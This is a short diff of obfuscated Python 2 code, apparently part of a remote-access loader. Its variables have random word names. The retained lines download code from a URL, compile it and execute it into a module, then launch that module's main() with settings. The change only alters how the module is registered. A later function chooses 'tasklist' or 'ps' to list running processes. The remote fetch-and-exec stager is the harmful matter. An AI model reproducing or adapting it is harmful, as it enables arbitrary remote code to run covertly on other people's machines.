@@ -57,9 +57,7 @@ def run(*args, **kwargs):
             QuarrelsomeImportedAtom     = urllib.urlopen(AmbiguousObedientQuestion).read()
             MajesticMachoOkra           = compile(QuarrelsomeImportedAtom, TalentedAlcoholicBeetle, 'exec')
             exec MajesticMachoOkra in PanoramicAbandonedCraftsman.__dict__
-            sys.modules['client']       = PanoramicAbandonedCraftsman
-            globals()['client']         = PanoramicAbandonedCraftsman
-            return sys.modules['client'].main(**AccidentalAquaticCactus['settings'])
+            return PanoramicAbandonedCraftsman.main(**AccidentalAquaticCactus['settings'])
 
 def main(*args, **kwargs):
     s = 'tasklist' if os.name is 'nt' else 'ps'
